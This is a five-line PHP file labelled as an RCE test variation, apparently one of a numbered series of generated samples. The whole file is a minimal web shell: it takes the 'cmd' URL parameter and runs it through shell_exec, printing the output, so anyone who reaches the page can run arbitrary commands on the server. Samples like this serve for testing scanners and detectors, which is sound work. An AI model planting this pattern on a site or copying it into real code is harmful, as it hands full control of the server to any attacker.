<?php
// RCE test variation #706
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>